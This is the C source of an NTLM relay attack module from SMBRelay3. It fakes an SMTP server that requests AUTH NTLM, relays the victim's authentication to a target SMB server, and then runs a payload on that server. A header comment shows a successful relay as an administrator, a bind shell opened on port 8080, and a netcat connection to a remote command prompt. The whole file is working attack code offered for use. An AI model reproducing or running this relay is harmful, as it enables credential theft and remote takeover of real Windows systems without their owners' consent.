/*
    SMBRelay3 - SMTP REPLAY ATTACK MODULE
    -------------------------------------


C:\smbrelay>smbrelay3.exe --ListForSMTPRequests
SmbRelay3 - SMB to SMB and HTTP to SMB replay attack
 (c) 2007 - 2008 Andres Tarasco - atarasco@gmail.com
 Website: http://www.tarasco.org

[+] Accepted Connection - Replaying against 192.168.47.128
[+] Sending SMTP Banner
[+] Answering EHLO command with an AUTH NTLM parameter
[+] received AUTH NTLM message
[+] Sending SMB Protocol Authentication Handshake
[+] Received SMB Message with NTLM message type 2 packet
[+] Replaying NTLM Challenge from SMB Server to the SMTP Client
[+] Trying to authenticate to remote SMB as Administrador
[+] Sending Final SMB Authentication packet with NTLM Message type 3
[+] SessionSetupAndX Completed
[+] Authenticacion against 192.168.47.128 Succeed with username Administrador
[+] *** Remote SmbRelay3 BindShell Service Running ***: (192.168.47.128:8080)

C:\smbrelay>nc 192.168.47.128 8080
Microsoft Windows 2000 [Versión 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\WINNT\system32>

*/


#include "smtprelay.h"
#include "payload.h"

extern int verbose;

int HandleIncommingSMTPRequest(RELAY *relay, char *destinationhostname, int destinationport)
{
	char buffer[4096];
	char buf[4096];
	char buf1[4096];
	char buf2[4096];

	char CurrentUserName[256];
	char CurrentDomain[256];
	char CurrentWorkstation[256];
	smheader *SmbPacket1, *SmbPacket2, *SmbPacket3, *NegotiateProtocol;
    tSmbNtlmAuthRequest *request;
	
	uint16 packetlen;
	int i;
    char *p;
	const char WelcomeMessage[]= "220 Microsoft ESMTP MAIL Service ready\n";
	const char AUTHMessage[]= "250-server.example.com Hello [10.10.2.20]\r\n250 AUTH NTLM\r\n";

    printf("[+] Sending SMTP Banner\n");
    i=SendBytesAndWaitForResponse(relay->source,(char*)WelcomeMessage, (int)strlen(WelcomeMessage), buffer,sizeof(buffer),SMBWAITTIMEOUT);
	if (i<=0){
		printf("Error Reading EHLO message\n");
        return(0);
	}
    printf("[+] Answering EHLO command with an AUTH NTLM parameter\n");
    memset(buffer,'\0',sizeof(buffer));
    i=SendBytesAndWaitForResponse(relay->source,(char*)AUTHMessage, (int)strlen(AUTHMessage), buffer,sizeof(buffer),SMBWAITTIMEOUT);
	if (i<=0){
		printf("[-] Error reading client AUTH NTLM message\n");
        return(0);
	}
	if (memcmp(buffer,"AUTH NTLM",9)!=0) {
		printf("[-] AUTH NTLM packet not received from client\n");
        i=SendBytesAndWaitForResponse(relay->source,(char*)"504 Unrecognized authentication type.\r\n", (int)39, buffer,sizeof(buffer),SMBWAITTIMEOUT);
        return(0);
	}
    if (strlen(buffer)>12) {
        printf("[+] received AUTH NTLM message\n");

        memset((char*)&buf1,'\0',sizeof(buf1));
	    packetlen=from64tobits(buf1, buffer+12);
        request=(tSmbNtlmAuthRequest *)buf1;
        dumpAuthRequest(0,request);
    } else {
        memset(buffer,'\0',sizeof(buffer));
        i=SendBytesAndWaitForResponse(relay->source,(char*)"334 NTLM Auth allowed\r\n", (int)23, buffer,sizeof(buffer),SMBWAITTIMEOUT);
        if (i<=0){
		    printf("[-] Error Auth response with NTLM type1 packet\n");
            return(0);
	    }
        printf("[+] received AUTH NTLM message\n");
        memset((char*)&buf1,'\0',sizeof(buf1));
	    packetlen=from64tobits(buf1, buffer);        
        request=(tSmbNtlmAuthRequest *)buf1;
        
        if (debug) {
            printf("[+] received AUTH NTLM message: %s\n",buffer);
            DumpMem(buf1,packetlen);
            dumpAuthRequest(0,request);
        }
    }


	//Init Replay Attack
    i=ConnectToRemoteHost(relay,destinationhostname,destinationport);
	if (!i) {
		printf("[-] Unable to connect to remote host %s:%i\n",destinationhostname,destinationport); 
		return(0);
	}
	printf("[+] Sending SMB Protocol Authentication Handshake\n");
    p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);
    p = AddDialect(p,"LANMAN1.0", 0x02,&i);
    p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
    p = AddDialect(p,"LM1.2X002", 0x02,&i);
    p = AddDialect(p,"LANMAN2.1", 0x02,&i);
    p = AddDialect(p,"NT LM 0.12", 0x02,&i);
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
    free(p);
    i=SendBytesAndWaitForResponse(relay->destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
    free(NegotiateProtocol);
	if (i<=0){
		printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed\n");
        return(0);
	}
	
	SmbPacket1=BuildSmbPacket1();
	if (debug)  {
		printf("\n[+] Dumping SMB Packet With NTLM Message Type 1\n");
		DumpMem((char*)SmbPacket1,SmbPacketLen(SmbPacket1));
	}

	SmbPacket2=GetSmbPacket2(relay,SmbPacket1);
	if  (SmbPacket2==NULL) {
		printf("[-] Unable to receive SMB Packet with NTLM Message Type 2\n");
        return(0);
	}
	printf("[+] Received SMB Message with NTLM message type 2 packet\n");
	memcpy((char*)&packetlen,GetNTLMPacketFromSmbPacket(SmbPacket2)-4,2);

    if (debug) {
        printf("[*] SMB Packet Dump:\n");
        DumpMem((char*)SmbPacket2,SmbPacketLen(SmbPacket2));
        printf("[*] NTLM Challenge packet from SMB message\n");
        DumpMem((char*)GetNTLMPacketFromSmbPacket(SmbPacket2),packetlen);
        dumpAuthChallenge(0,(tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2));
    }
		
    ((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->flags=0xb207;
	memset(buf1,'\0',sizeof(buf1));
	to64frombits((unsigned char*)&buf1, (unsigned char*)GetNTLMPacketFromSmbPacket(SmbPacket2), packetlen);
	sprintf(buf,"334 %s\r\n",buf1);

	printf("[+] Replaying NTLM Challenge from SMB Server to the SMTP Client\n");
	if (debug)
	{
		printf("[+] Sending SMTP Response: %s\n",buf);
	}   
    i=SendBytesAndWaitForResponse(relay->source,(char*)buf,(int)strlen(buf),(char*)buffer,sizeof(buffer),SMBWAITTIMEOUT);
	if (i<=0)
	{
		printf("[-] Unable to read NTLM packet 3 from smtp client\n");
        return(0);
	}
    buffer[i]='\0';

    if (debug) printf("[*] Response: %s\n",buffer);
	memset((char*)&buf1,'\0',sizeof(buf1));
	packetlen=from64tobits(buf1, buffer);
    if (debug) {
        
		    printf("[*] Raw authorization packet (len: %i)\n",packetlen);
		    DumpMem(buf1,packetlen);
            dumpAuthResponse(0,(tSmbNtlmAuthResponse*)buf1);	
	}

    
	GetNTLMPacketInfo((tSmbNtlmAuthResponse*)buf1,(char*)&CurrentUserName, (char*)&CurrentDomain, (char*)&CurrentWorkstation,verbose);
	printf("[+] Trying to authenticate to remote SMB as %s\n",CurrentUserName);
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,CurrentUserName,NULL,NULL,CurrentWorkstation, (tSmbNtlmAuthResponse*)buf1);
    SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));
    

	printf("[+] Sending Final SMB Authentication packet with NTLM Message type 3\n");
	if (debug) 
	{
		DumpMem((char*)SmbPacket3, SmbPacketLen(SmbPacket3));
	}

    i=SendBytesAndWaitForResponse(relay->destination,(char*)SmbPacket3, SmbPacketLen(SmbPacket3),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response\n");
        return(0);
	}
	if (debug)  {
		printf("[*] SessionSetupAndX Completed - Dumping received packet\n");
		DumpMem(buf,i);
	}

	if (((smheader*)buf)->NtStatus!=0x00000000) {
		printf("[-] SessionSetupAndX Completed\n[-] Authentication against Remote Host Failed\n");
        return(0);
	}
    if ( ((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001 )
    {
         printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");
         
        return(0);
    }
		
	//WriteDataToReportFile("log.txt", (tSmbNtlmAuthResponse*)buf1, destinationhostname,(unsigned char*)((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->challengeData);
	
	printf("[+] SessionSetupAndX Completed \n");
	printf("[+] Authenticacion against %s Succeed with username %s\n",destinationhostname,CurrentUserName);

	ExecuteCode( *relay);



	


	return(0);

}

